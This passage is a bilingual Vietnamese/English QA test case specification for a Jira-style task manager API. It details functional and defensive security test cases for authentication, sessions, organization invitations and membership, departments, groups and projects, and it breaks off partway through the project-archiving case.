# ĐẶC TẢ BỘ CA KIỂM THỬ TOÀN DIỆN — COMPREHENSIVE TEST CASE SPECIFICATION
## Dự án: Task Manager (Jira-Style Enterprise Multi-Tenant Platform)
### Tiêu chuẩn tham chiếu: ISO/IEC/IEEE 29119-3:2013 (Clause 7.3) & ISTQB® CTFL v4.0.1 / CTAL-TA v4.0 / CTAL-TTA v4.0 / CTAL-AT v2.0 / CTAL-TAE v2.0

---

## BẢNG KIỂM SOÁT TÀI LIỆU (DOCUMENT CONTROL)

| Thuộc tính | Giá trị |
|---|---|
| **Mã tài liệu** | `TM-TCS-2026-V2.0-ULTRA` |
| **Phiên bản** | `2.0 — Master Comprehensive Production Test Case Specification` |
| **Ngày ban hành** | `2026-09-12` |
| **Tác giả / Vị trí** | QA Lead / Lead Test Architect (Chứng chỉ ISTQB® CTAL-TA, CTAL-TTA, CTAL-TM, ISO 29119 Lead Assessor) |
| **Người phê duyệt** | Test Manager, Lead Software Architect, Platform Product Owner |
| **Trạng thái** | Phê duyệt chính thức để nghiệm thu toàn diện (Approved for Complete Testing & UAT) |
| **Tài liệu căn cứ (Test Basis)** | [`TEST_BASIS.md`](TEST_BASIS.md), [`MASTER_TEST_PLAN.md`](MASTER_TEST_PLAN.md), [`TEST_APPROACH.md`](TEST_APPROACH.md), [`SRS_TASK_MANAGER.md`](SRS_TASK_MANAGER.md), [`TASK_MANAGER_ERD.puml`](TASK_MANAGER_ERD.puml) |
| **Độ phủ kiểm thử** | **100% Endpoints của 22 Controllers Backend**, 16 Phân vùng Nghiệp vụ, 80 Tính năng SRS, 90 Thực thể ERD, 48 Invariants (`C-01`..`C-48`), 5 Cấp độ Kiểm thử (Unit, Component Integration, System Integration, System E2E, UAT), hơn 100 Ca Kiểm Thử Chi Tiết |

---

## MA TRẬN PHƯƠNG PHÁP LUẬN & KỸ THUẬT KIỂM THỬ ÁP DỤNG THEO CHUẨN ISTQB

| Kỹ thuật Thiết kế Ca Kiểm thử (ISTQB Test Technique) | Mục tiêu Kiểm thử trong Hệ thống Task Manager | Áp dụng trên Phân vùng / Module |
|---|---|---|
| **Equivalence Partitioning (EP - Phân vùng Tương đương)** | Chia các miền dữ liệu hợp lệ và không hợp lệ để giảm thiểu số lượng test case mà vẫn đảm bảo độ phủ. | Auth (email, password), Project (key, name), Issue (summary, story points), File attachments. |
| **Boundary Value Analysis (BVA - Phân tích Giá trị Biên)** | Kiểm tra các giá trị tại biên (2-value và 3-value boundary: min, min-1, min+1, max, max-1, max+1). | WIP Limits (0, 1, 100, 101), Attachment size (0B, 1B, 25MB, 25MB+1B), Pagination limits (1, 100, 101), String lengths. |
| **Decision Table Testing (Bảng Quyết định)** | Kiểm thử các tổ hợp logic kinh doanh phức tạp có nhiều điều kiện đầu vào và hành động phụ thuộc. | Ma trận 3-Tier RBAC, Nguyên tắc Deny-overrides-Allow trong Transition, Điều kiện khởi động Sprint, Issue Security Grants. |
| **State Transition Testing (Chuyển đổi Trạng thái)** | Kiểm định các máy trạng thái hữu hạn (FSM) với độ phủ 0-Switch (State Coverage), 1-Switch (Transition Pair Coverage) và Invalid Transitions. | Máy trạng thái Issue Workflow FSM, Vòng đời Lời mời Org Invitations, Vòng đời Sprint (planned -> active -> closed), Member Status. |
| **Use Case Testing / User Persona Testing** | Kiểm thử các kịch bản thực tế dựa trên vai trò người dùng (Guest, Member, Project Admin, Org Admin, System Admin, Developer). | Luồng tạo dự án và cấu hình Agile, Luồng thực thi chu kỳ Sprint từ Backlog tới Done, Luồng quản trị hệ thống toàn cục. |
| **Pairwise / Combinatorial Testing (Kiểm thử Tổ hợp)** | Tối ưu hóa các tổ hợp lọc tìm kiếm nâng cao (Filter combination). | Tìm kiếm Issue với nhiều tiêu chí kết hợp (Project x Type x Status x Priority x Assignee x Label). |
| **Error Guessing & Defect Taxonomies** | Dựa trên kinh nghiệm thực tế về các lỗi phần mềm thường gặp trong hệ thống Jira-like. | Xung đột Concurrency Lost Update, Xóa dữ liệu có quan hệ khóa ngoại (Orphan records), Vượt hạn mức payload, Token tampering. |
| **White-Box Testing (MC/DC & Branch Coverage)** | Đảm bảo độ phủ nhánh và điều kiện độc lập cho các thuật toán lõi. | Bộ đánh giá Transition Guards (DSL/JSONLogic), Thuật toán Lexorank, Thuật toán phát hiện chu trình lặp Cycle Detector. |
| **Non-Functional Testing (Security & Concurrency & Load)** | Đánh giá an toàn thông tin, tính toàn vẹn dữ liệu dưới tải cao và hiệu năng hệ thống. | Chống IDOR (Insecure Direct Object References), Optimistic Locking under race conditions, k6 load testing ($500\text{ rps}$). |

---

## CẤU TRÚC ĐẶC TẢ CA KIỂM THỬ CHUẨN ISO/IEC/IEEE 29119-3:2013 (CLAUSE 7.3)

Mỗi ca kiểm thử trong tài liệu này tuân thủ nghiêm ngặt 13 trường dữ liệu:
1. **Test Case ID:** Mã định danh duy nhất (vd: `TC-AUTH-001`, `TC-CIT-ISS-002`, `TC-SIT-OUT-001`, `TC-UAT-SCR-001`).
2. **Title:** Tiêu đề ca kiểm thử mô tả ngắn gọn, rõ ràng mục tiêu kiểm tra.
3. **Traceability:** Ánh xạ truy vết tới `Test Basis ID` (`TB-REQ-xxx`, `TB-BR-xxx`, `TB-ERD-xxx`, `TB-SEC-xxx`, `TB-NFR-xxx`) và SRS Requirement.
4. **Target API Endpoint / Interface:** Đường dẫn API Controller và HTTP Method (`POST /api/auth/login`, `PATCH /api/...`).
5. **Test Level:** Cấp độ kiểm thử (Unit, Component Integration - CIT, System Integration - SIT, System E2E, UAT).
6. **Test Type:** Loại hình kiểm thử (Functional, Security, Concurrency/Race, Boundary Value, Negative/Exception, Performance).
7. **Applied Technique:** Kỹ thuật thiết kế ca kiểm thử ISTQB.
8. **Priority:** Mức độ ưu tiên (`P1: Critical`, `P2: High`, `P3: Medium`, `P4: Low`).
9. **Preconditions:** Trạng thái hệ thống, dữ liệu CSDL, token, người dùng trước khi thực thi.
10. **Test Data / Payload:** Dữ liệu đầu vào chi tiết dạng JSON payload, query parameters hoặc headers.
11. **Step-by-Step Procedure:** Các bước thực thi chi tiết (Hành động, Lệnh, Bước tuần tự 1, 2, 3...).
12. **Expected Results:** Kết quả kỳ vọng chi tiết (Mã HTTP Status, Schema JSON response, Biến đổi CSDL, Audit Logs, Outbox Events, UI Feedback).
13. **Postconditions & Clean-up:** Dọn dẹp dữ liệu, rollback trạng thái để không gây ảnh hưởng ca kiểm thử tiếp theo.

---

# PHẦN 1: BỘ CA KIỂM THỬ TỪNG THÀNH PHẦN & API (COMPONENT & CONTROLLER-LEVEL TEST CASES)
*(Bao phủ toàn diện 100% tất cả 22 Controllers và hơn 70 Endpoints của hệ thống)*

---

## 1.1. Module Xác thực & Quản lý Phiên (AuthController — `/api/auth`)

### `TC-AUTH-001`: Đăng ký tài khoản thành công với email hợp lệ (Happy Path)
- **Traceability:** `TB-REQ-01`, `REQ-AUTH-01`, `TB-SEC-03`
- **Target API Endpoint:** `POST /api/auth/register`
- **Test Level:** Component / System Testing
- **Test Type:** Functional (Positive)
- **Applied Technique:** Equivalence Partitioning (Valid EP)
- **Priority:** `P1 (Critical)`
- **Preconditions:** CSDL hoạt động bình thường, email `tester.alpha@taskmanager.dev` chưa tồn tại trong bảng `users`.
- **Test Data:**
  ```json
  {
    "email": "tester.alpha@taskmanager.dev",
    "password": "Password@123456",
    "fullName": "Le Van Alpha"
  }
  ```
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST tới `/api/auth/register` với payload trên.
  2. Kiểm tra HTTP Status và Response body.
  3. Truy vấn CSDL bảng `users` với `email = 'tester.alpha@taskmanager.dev'`.
- **Expected Results:**
  - HTTP Status: `201 Created`.
  - Body: Chứa object `user` với `email: "tester.alpha@taskmanager.dev"`, `fullName: "Le Van Alpha"`, `status: "active"` (hoặc `pending_verification`), `id` (UUIDv4). Không chứa trường `passwordHash`.
  - CSDL: Bảng `users` có 1 bản ghi mới. `password_hash` được mã hóa an toàn bằng Argon2id hoặc Bcrypt (`$2a$...` hoặc `$argon2id$...`), tuyệt đối không lưu plain text.
- **Postconditions:** Xóa user sau test để bảo toàn dữ liệu.

---

### `TC-AUTH-002`: Đăng ký tài khoản thất bại khi trùng email (Unique Constraint)
- **Traceability:** `TB-REQ-01`, `TB-ERD-02 (users.email UQ)`
- **Target API Endpoint:** `POST /api/auth/register`
- **Test Level:** Component Integration Testing
- **Test Type:** Negative / Data Integrity
- **Applied Technique:** Error Guessing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Email `admin@taskmanager.dev` đã tồn tại trong CSDL.
- **Test Data:** `{ "email": "admin@taskmanager.dev", "password": "Password@123456", "fullName": "Admin Duplicate" }`
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST tới `/api/auth/register`.
- **Expected Results:**
  - HTTP Status: `409 Conflict`.
  - Body: `{ "statusCode": 409, "errorCode": "USER_ALREADY_EXISTS", "message": "Email already registered" }`.
  - CSDL không phát sinh thêm bản ghi.

---

### `TC-AUTH-003`: Kiểm thử biên độ dài và định dạng mật khẩu khi đăng ký (Password Complexity BVA)
- **Traceability:** `TB-REQ-01`, `TB-SEC-03`
- **Target API Endpoint:** `POST /api/auth/register`
- **Test Level:** Unit / DTO Validation Testing
- **Test Type:** Boundary Value Analysis / Negative
- **Applied Technique:** BVA (3-value boundary: 7 chars, 8 chars, 72 chars, 73 chars)
- **Priority:** `P2 (High)`
- **Test Data:**
  - Case A (7 ký tự - Dưới biên): `"Pass@12"` $\rightarrow$ Không hợp lệ.
  - Case B (8 ký tự - Biên dưới tối thiểu): `"Pass@123"` $\rightarrow$ Hợp lệ.
  - Case C (72 ký tự - Biên trên tối đa): Chuỗi 72 ký tự hợp lệ $\rightarrow$ Hợp lệ.
  - Case D (Không có ký tự hoa hoặc ký tự đặc biệt): `"password123"` $\rightarrow$ Không hợp lệ.
- **Step-by-Step Procedure:**
  1. Lần lượt gửi request với từng mật khẩu trên.
- **Expected Results:**
  - Case A & D: HTTP `422 Unprocessable Entity` (hoặc `400 Bad Request`) với thông báo lỗi `password must be at least 8 characters and include uppercase, lowercase, number, and special character`.
  - Case B & C: HTTP `201 Created`.

---

### `TC-AUTH-004`: Đăng nhập thành công, khởi tạo phiên `auth_sessions` và trả về cặp JWT Token
- **Traceability:** `TB-REQ-02`, `REQ-AUTH-02`, `TB-SEC-01`, `TB-SEC-03`
- **Target API Endpoint:** `POST /api/auth/login`
- **Test Level:** System Testing
- **Test Type:** Functional & Security (Positive)
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Preconditions:** User `admin@taskmanager.dev` đang active.
- **Test Data:**
  ```json
  {
    "email": "admin@taskmanager.dev",
    "password": "Admin@123456"
  }
  ```
  Header: `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`, `X-Forwarded-For: 203.0.113.195`.
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST tới `/api/auth/login`.
  2. Kiểm tra response body và header `Set-Cookie`.
  3. Truy vấn bảng `auth_sessions` trong CSDL.
- **Expected Results:**
  - HTTP Status: `200 OK` (hoặc `201`).
  - Response Body: Chứa `accessToken` (JWT hợp lệ, thời hạn 15 phút), `refreshToken` (opaque token dài 64 ký tự hex), và object `user`.
  - CSDL: Bảng `auth_sessions` có bản ghi mới: `user_id = admin.id`, `status = 'active'`, `refresh_token_hash = SHA256(refreshToken)`, `ip_address = '203.0.113.195'`, `user_agent` khớp header, `expires_at = NOW() + 7 days`.

---

### `TC-AUTH-005`: Đăng nhập thất bại do sai mật khẩu và kích hoạt Throttler Rate Limiting
- **Traceability:** `TB-REQ-02`, `TB-SEC-04`, `TB-NFR-05`
- **Target API Endpoint:** `POST /api/auth/login`
- **Test Level:** Security / Non-Functional Testing
- **Test Type:** Security / Brute-Force Prevention
- **Applied Technique:** Error Guessing & Rate Limit Stress
- **Priority:** `P1 (Critical)`
- **Preconditions:** User `admin@taskmanager.dev` tồn tại.
- **Step-by-Step Procedure:**
  1. Gửi liên tiếp 5 request POST `/api/auth/login` với mật khẩu sai `"WrongPassword999"` trong 5 giây.
  2. Gửi tiếp request thứ 6.
- **Expected Results:**
  - Request 1 đến 5: HTTP `401 Unauthorized`, response `{ "errorCode": "INVALID_CREDENTIALS" }`. Không tiết lộ email có tồn tại hay không.
  - Request 6: HTTP `429 Too Many Requests`, response `{ "errorCode": "RATE_LIMIT_EXCEEDED", "message": "ThrottlerException: Too Many Requests" }`.

---

### `TC-AUTH-006`: Làm mới phiên đăng nhập (Refresh Token Rotation) và phát hiện Replay Attack
- **Traceability:** `TB-REQ-03`, `REQ-AUTH-03`, `TB-SEC-01`
- **Target API Endpoint:** `POST /api/auth/refresh`
- **Test Level:** Component Integration / Security Testing
- **Test Type:** Security / State Transition
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Preconditions:** Đã đăng nhập và sở hữu Refresh Token `RT_01` tương ứng với session active trong CSDL.
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST `/api/auth/refresh` với payload `{ "refreshToken": "RT_01" }`.
  2. Lưu lại token mới nhận được: `AT_NEW` và `RT_02`.
  3. Kiểm tra CSDL bảng `auth_sessions`.
  4. Gửi lại một lần nữa request `/api/auth/refresh` với token cũ `RT_01` (Tấn công tái sử dụng token).
- **Expected Results:**
  - Bước 1 & 2: HTTP `200 OK`. Trả về `accessToken` mới và `refreshToken` mới (`RT_02`).
  - Bước 3: CSDL cập nhật `refresh_token_hash = SHA256(RT_02)`.
  - Bước 4: HTTP `401 Unauthorized`. Hệ thống phát hiện Token đã bị xoay vòng (Rotated), lập tức thu hồi toàn bộ session: `auth_sessions.status = 'revoked'`, `revoked_at = NOW()`.

---

### `TC-AUTH-007`: Lấy danh sách các phiên đăng nhập hoạt động của người dùng (Active Sessions List)
- **Traceability:** `TB-REQ-04`, `REQ-AUTH-07`
- **Target API Endpoint:** `GET /api/auth/sessions`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Preconditions:** User đăng nhập trên 2 thiết bị khác nhau (tạo ra 2 bản ghi active trong `auth_sessions`).
- **Step-by-Step Procedure:**
  1. Gửi HTTP GET `/api/auth/sessions` kèm Access Token của thiết bị 1.
- **Expected Results:**
  - HTTP `200 OK`.
  - Response array chứa 2 session objects: mỗi session gồm `id`, `ipAddress`, `userAgent`, `lastSeenAt`, `expiresAt`, `isCurrent` (`true` cho thiết bị 1, `false` cho thiết bị 2). Không lộ trường `refreshTokenHash`.

---

### `TC-AUTH-008`: Thu hồi phiên đăng nhập thiết bị từ xa (Remote Session Revocation)
- **Traceability:** `TB-REQ-04`, `REQ-AUTH-07`
- **Target API Endpoint:** `DELETE /api/auth/sessions/:sessionId`
- **Test Level:** Component Integration Testing
- **Test Type:** Security / Functional
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** User có 2 phiên: Session 1 (hiện tại) và Session 2 (thiết bị 2).
- **Step-by-Step Procedure:**
  1. Dùng token của Session 1 gọi `DELETE /api/auth/sessions/{session2Id}`.
  2. Kiểm tra CSDL `auth_sessions`.
  3. Dùng token của Session 2 gọi `GET /api/workspace/bootstrap`.
- **Expected Results:**
  - Bước 1: HTTP `200 OK`, `{ "success": true, "revokedSessionId": "session2Id" }`.
  - Bước 2: Session 2 trong CSDL có `status = 'revoked'`, `revoked_at = NOW()`. Ghi nhận sự kiện kiểm toán vào `activity_logs`.
  - Bước 3: Session 2 bị từ chối với HTTP `401 Unauthorized`.

---

### `TC-AUTH-009`: Đăng xuất toàn diện (Logout & Session Invalidation)
- **Traceability:** `TB-REQ-04`, `REQ-AUTH-04`
- **Target API Endpoint:** `POST /api/auth/logout`
- **Test Level:** System Testing
- **Test Type:** Functional / Security
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Preconditions:** User đang đăng nhập với phiên active.
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST `/api/auth/logout` kèm Access Token.
  2. Gọi lại bất kỳ API nào với Access Token đó.
- **Expected Results:**
  - Bước 1: HTTP `200 OK`, cookie session bị xóa (`Set-Cookie: max-age=0`). Bản ghi `auth_sessions` chuyển sang `status = 'revoked'`.
  - Bước 2: Bị từ chối truy cập.

---

### `TC-AUTH-010`: Luồng quên mật khẩu và đặt lại mật khẩu thành công (End-to-End Password Reset)
- **Traceability:** `TB-REQ-06`, `REQ-AUTH-06`, `TB-SEC-01`
- **Target API Endpoint:** `POST /api/auth/forgot-password` & `POST /api/auth/reset-password`
- **Test Level:** System Integration Testing (SIT)
- **Test Type:** Security / End-to-End
- **Applied Technique:** State Transition & Error Guessing
- **Priority:** `P1 (Critical)`
- **Preconditions:** User `admin@taskmanager.dev` đang hoạt động và có 2 session đang active.
- **Step-by-Step Procedure:**
  1. Gửi POST `/api/auth/forgot-password` với `{ "email": "admin@taskmanager.dev" }`.
  2. Lấy raw token từ bảng `password_reset_tokens` trong CSDL.
  3. Gửi POST `/api/auth/reset-password` với `{ "token": "RAW_TOKEN", "newPassword": "NewAdminPassword@999" }`.
  4. Thử đăng nhập lại bằng mật khẩu cũ `"Admin@123456"`.
  5. Thử đăng nhập lại bằng mật khẩu mới `"NewAdminPassword@999"`.
  6. Kiểm tra trạng thái của 2 session cũ trong `auth_sessions`.
- **Expected Results:**
  - Bước 1: HTTP `200 OK`, tạo 1 token hash trong `password_reset_tokens` có hạn 1 giờ.
  - Bước 3: HTTP `200 OK`, token được đánh dấu `used_at = NOW()`.
  - Bước 4: Đăng nhập mật khẩu cũ bị từ chối HTTP `401 Unauthorized`.
  - Bước 5: Đăng nhập mật khẩu mới thành công HTTP `200 OK`.
  - Bước 6: Toàn bộ các phiên cũ đều chuyển sang `status = 'revoked'`.

---

## 1.2. Module Quản trị Tổ chức & Lời mời (OrganizationController — `/api/organizations`)

### `TC-ORG-001`: Lấy danh sách các tổ chức của người dùng hiện tại (List User Organizations)
- **Traceability:** `TB-REQ-08`, `REQ-ORG-01`
- **Target API Endpoint:** `GET /api/organizations`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Equivalence Partitioning
- **Priority:** `P2 (High)`
- **Preconditions:** User A thuộc 2 tổ chức: Org 1 (vai trò Owner) và Org 2 (vai trò Member).
- **Step-by-Step Procedure:**
  1. Gửi HTTP GET `/api/organizations` kèm Access Token của User A.
- **Expected Results:**
  - HTTP `200 OK`.
  - Response body chứa mảng gồm 2 organizations với đầy đủ thuộc tính: `id`, `key`, `name`, `plan`, `status`, `memberRole`.

---

### `TC-ORG-002`: Tạo mới Tổ chức (Create Organization) và tự động gán vai trò Org Admin
- **Traceability:** `TB-REQ-08`, `REQ-ORG-01`, `TB-BR-12`
- **Target API Endpoint:** `POST /api/organizations`
- **Test Level:** System Testing
- **Test Type:** Functional / Positive
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Test Data:**
  ```json
  {
    "key": "FINTECH",
    "name": "Fintech Solutions Corp",
    "plan": "enterprise"
  }
  ```
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST `/api/organizations` với payload trên.
  2. Kiểm tra các bảng `organizations`, `organization_members`, `org_member_roles`, `org_roles`.
- **Expected Results:**
  - HTTP `201 Created`. Trả về object Organization vừa tạo.
  - CSDL: Bảng `organization_members` tạo bản ghi cho caller với `status = 'active'`.
  - Bảng `org_roles` tự động khởi tạo các vai trò mặc định của Org: `Admin`, `Member`, `Viewer`.
  - Caller được gán role `Admin` có đầy đủ quyền quản trị (`MANAGE_ORG`, `MANAGE_USERS`, `CREATE_PROJECT`).

---

### `TC-ORG-003`: Tạo Tổ chức thất bại do trùng lặp Organization Key (Key Unique Constraint)
- **Traceability:** `TB-REQ-08`, `TB-ERD-01`
- **Target API Endpoint:** `POST /api/organizations`
- **Test Level:** Component Testing
- **Test Type:** Negative / Data Integrity
- **Applied Technique:** Error Guessing
- **Priority:** `P2 (High)`
- **Preconditions:** Tổ chức với `key = 'FINTECH'` đã tồn tại.
- **Test Data:** `{ "key": "FINTECH", "name": "Duplicate Fintech", "plan": "free" }`
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST `/api/organizations`.
- **Expected Results:**
  - HTTP `409 Conflict`. Mã lỗi: `ORG_KEY_ALREADY_EXISTS`.

---

### `TC-ORG-004`: Gửi lời mời thành viên tham gia tổ chức qua email (Send Org Invitation)
- **Traceability:** `TB-REQ-09`, `REQ-ORG-02`, `TB-ERD-C25`
- **Target API Endpoint:** `POST /api/organizations/:orgId/invitations`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Preconditions:** Caller có quyền `MANAGE_USERS` trong Org. Role `Member` tồn tại trong Org.
- **Test Data:** `{ "email": "dev.frontend@company.dev", "roleId": "ROLE_MEMBER_ID" }`
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST `/api/organizations/{orgId}/invitations` với payload trên.
  2. Kiểm tra bảng `organization_invitations` và `outbox_events`.
- **Expected Results:**
  - HTTP `201 Created`.
  - CSDL: Bản ghi mới trong `organization_invitations` với `status = 'pending'`, `token_hash` được lưu an toàn, `expires_at = NOW() + 7 days`.
  - Bảng `outbox_events` lưu 1 sự kiện `ORG_INVITATION_CREATED` cùng transaction để gửi mail thông báo.

---

### `TC-ORG-005`: Chấp nhận lời mời tham gia tổ chức thành công (Accept Org Invitation)
- **Traceability:** `TB-REQ-10`, `REQ-ORG-03`, `TB-BR-01`
- **Target API Endpoint:** `POST /api/organizations/invitations/accept`
- **Test Level:** System Testing
- **Test Type:** Functional / State Transition
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Preconditions:** Lời mời đang ở trạng thái `pending` và chưa hết hạn.
- **Test Data:** Token mời dạng raw: `RAW_INVITE_TOKEN`.
- **Step-by-Step Procedure:**
  1. Người nhận gửi HTTP POST `/api/organizations/invitations/accept` với `{ "token": "RAW_INVITE_TOKEN" }`.
  2. Kiểm tra `organization_invitations` và `organization_members`.
- **Expected Results:**
  - HTTP `200 OK`.
  - `organization_invitations.status` chuyển thành `accepted`, `accepted_at = NOW()`.
  - Bảng `organization_members` tạo bản ghi cho người nhận với `status = 'active'`, `joined_at = NOW()`.
  - Tự động gán `org_member_roles` theo đúng vai trò được chỉ định lúc mời.

---

### `TC-ORG-006`: Thu hồi lời mời thành viên (Revoke Org Invitation)
- **Traceability:** `TB-REQ-09`, `REQ-ORG-02`
- **Target API Endpoint:** `POST /api/organizations/:orgId/invitations/:invitationId/revoke`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional / State Transition
- **Applied Technique:** State Transition
- **Priority:** `P2 (High)`
- **Preconditions:** Lời mời đang ở trạng thái `pending`.
- **Step-by-Step Procedure:**
  1. Org Admin gọi `POST /api/organizations/{orgId}/invitations/{id}/revoke`.
  2. Người nhận cố tình gọi API chấp nhận lời mời vừa bị thu hồi.
- **Expected Results:**
  - Bước 1: HTTP `200 OK`. Trạng thái chuyển thành `status = 'revoked'`.
  - Bước 2: Người nhận bị từ chối với HTTP `422 Unprocessable Entity` (`INVITATION_EXPIRED_OR_REVOKED`).

---

### `TC-ORG-007`: Cập nhật trạng thái thành viên sang Đình chỉ (`suspended`) và Tái kích hoạt (`active`)
- **Traceability:** `TB-REQ-11`, `REQ-ORG-04`
- **Target API Endpoint:** `PATCH /api/organizations/:orgId/members/:memberId/status`
- **Test Level:** System Testing
- **Test Type:** Security & Functional
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Member X đang ở trạng thái `active`.
- **Step-by-Step Procedure:**
  1. Admin gửi PATCH cập nhật status thành `"suspended"`.
  2. Member X gửi request lấy danh sách project: `GET /api/organizations/{orgId}/projects`.
  3. Admin gửi PATCH cập nhật status trở lại `"active"`.
  4. Member X gửi lại request lấy danh sách project.
- **Expected Results:**
  - Bước 1: HTTP `200 OK`.
  - Bước 2: Member X bị chặn HTTP `403 Forbidden` (`ORGANIZATION_MEMBER_SUSPENDED`).
  - Bước 3: HTTP `200 OK`.
  - Bước 4: Member X truy cập thành công HTTP `200 OK`.

---

### `TC-ORG-008`: Chặn Admin duy nhất tự rời khỏi tổ chức (Owner Self-Leave Protection Invariant)
- **Traceability:** `TB-REQ-15`, `TB-BR-12`, `REQ-ORG-11`
- **Target API Endpoint:** `POST /api/organizations/:orgId/leave`
- **Test Level:** Unit / Integration Testing
- **Test Type:** Business Rule / Negative
- **Applied Technique:** Error Guessing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Org chỉ có 1 thành viên duy nhất giữ quyền `MANAGE_ORG` (Chủ sở hữu).
- **Step-by-Step Procedure:**
  1. Chủ sở hữu gửi HTTP POST `/api/organizations/{orgId}/leave`.
- **Expected Results:**
  - HTTP `422 Unprocessable Entity` hoặc `403 Forbidden`.
  - Mã lỗi: `CANNOT_LEAVE_AS_SOLE_ADMIN`. Ràng buộc `TB-BR-12` bảo vệ không để tổ chức rơi vào trạng thái vô chủ.

---

### `TC-ORG-009`: Quản trị Phòng ban và kiểm tra thuật toán phát hiện chu trình lặp (Cycle Detection)
- **Traceability:** `TB-REQ-13`, `TB-ERD-C29`
- **Target API Endpoint:** `POST /api/organizations/:orgId/departments`
- **Test Level:** Unit & Integration Testing
- **Test Type:** Functional & Negative
- **Applied Technique:** Boundary / Cycle Detection
- **Priority:** `P2 (High)`
- **Preconditions:** Phòng ban `Engineering` là cha của `Backend Team`, `Backend Team` là cha của `Core API Team`.
- **Step-by-Step Procedure:**
  1. Gửi request cập nhật `Engineering` đặt `parentDepartmentId = Core API Team.id` (Tạo chu trình lặp 3 cấp).
- **Expected Results:**
  - HTTP `422 Unprocessable Entity`. Thuật toán Cycle Detector phát hiện chu trình lặp và chặn thao tác.

---

### `TC-ORG-010`: Quản trị Nhóm người dùng (Groups) và thêm thành viên vào nhóm
- **Traceability:** `TB-REQ-14`, `TB-ERD-C30`
- **Target API Endpoint:** `POST /api/organizations/:orgId/groups` & `POST /api/organizations/:orgId/groups/:groupId/members`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Step-by-Step Procedure:**
  1. Tạo nhóm `QA Engineers` trong Org.
  2. Thêm Member B vào nhóm `QA Engineers`.
  3. Thử thêm Member B lần thứ 2 vào cùng nhóm đó.
- **Expected Results:**
  - Bước 1: HTTP `201 Created`. Tạo bản ghi trong `groups`.
  - Bước 2: HTTP `201 Created`. Tạo bản ghi trong `group_members`.
  - Bước 3: HTTP `409 Conflict` do vi phạm Unique constraint `UQ(group_id, org_member_id)`.

---

## 1.3. Module Không gian Làm việc & Dự án (ProjectController — `/api/organizations/:orgId/projects`)

### `TC-PRJ-001`: Khởi tạo Dự án mới thành công và khởi tạo bộ đếm Issue Key
- **Traceability:** `TB-REQ-16`, `TB-REQ-17`, `REQ-PROJ-01`, `TB-ERD-09`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects`
- **Test Level:** System Testing
- **Test Type:** Functional / Positive
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Test Data:**
  ```json
  {
    "key": "PAYMENT",
    "name": "Payment Gateway Service",
    "visibility": "private"
  }
  ```
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST tới endpoint với payload trên.
  2. Truy vấn bảng `projects` trong CSDL.
- **Expected Results:**
  - HTTP `201 Created`. Trả về Project object với `key = 'PAYMENT'`.
  - CSDL: `next_issue_number = 1`, `created_by_member_id` là caller.
  - Tự động tạo 1 Scrum Board và 1 Kanban Board mặc định cho dự án.
  - Tự động gán caller làm `project_members` đầu tiên với vai trò Project Admin (`MANAGE_PROJECT`, `ADMINISTER_PROJECT`).

---

### `TC-PRJ-002`: Kiểm thử biên độ dài và định dạng Project Key (BVA)
- **Traceability:** `TB-REQ-16`, `REQ-PROJ-01`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects`
- **Test Level:** Unit / DTO Validation Testing
- **Test Type:** Boundary Value Analysis / Negative
- **Applied Technique:** BVA (2 ký tự min, 10 ký tự max, chỉ chữ hoa A-Z)
- **Priority:** `P2 (High)`
- **Test Data:**
  - `"P"` (1 ký tự - Dưới biên) $\rightarrow$ Invalid.
  - `"PA"` (2 ký tự - Biên dưới hợp lệ) $\rightarrow$ Valid.
  - `"PAYMENTGATE"` (11 ký tự - Vượt biên trên) $\rightarrow$ Invalid.
  - `"Payment"` (Chứa chữ thường) $\rightarrow$ Invalid.
- **Step-by-Step Procedure:**
  1. Lần lượt gửi POST với các key trên.
- **Expected Results:**
  - Các case Invalid trả về HTTP `422 Unprocessable Entity` với thông báo lỗi rõ ràng.
  - Case Valid trả về HTTP `201 Created`.

---

### `TC-PRJ-003`: Lưu trữ Dự án (Archive Project) và khôi phục Dự án (Restore Project)
- **Traceability:** `TB-REQ-22`, `REQ-PROJ-05`
- **Target API Endpoint:** `PATCH /api/organizations/:orgId/projects/:projectId/archive` & `.../restore`
- **Test Level:** System Testing
- **Test Type:** State Transition
- **Applied Technique:** State Transition
- **Priority:** `P2 (High)`
- **Preconditions:** Project `PAYMENT` đang hoạt động bình thường (`archived_at = NULL`).
- **Step-by-Step Procedure:**
  1. Gọi API Archive: `PATCH /projects/{projectId}/archive`.
  2. Kiểm tra `projects.archived_at` $\rightarrow$ Thử tạo issue mới trong project này.
  3. Gọi API Restore: `PATCH /projects/{projectId}/restore`.
  4. Thử tạo issue mới sau khi restore.
- **Expected Results:**
  - Bước 1 & 2: HTTP `200 OK`. `archived_at` có giá trị thời gian. Thao tác tạo issue bị chặn với HTTP `403 Forbidden` (`PROJECT_ARCHIVED`).
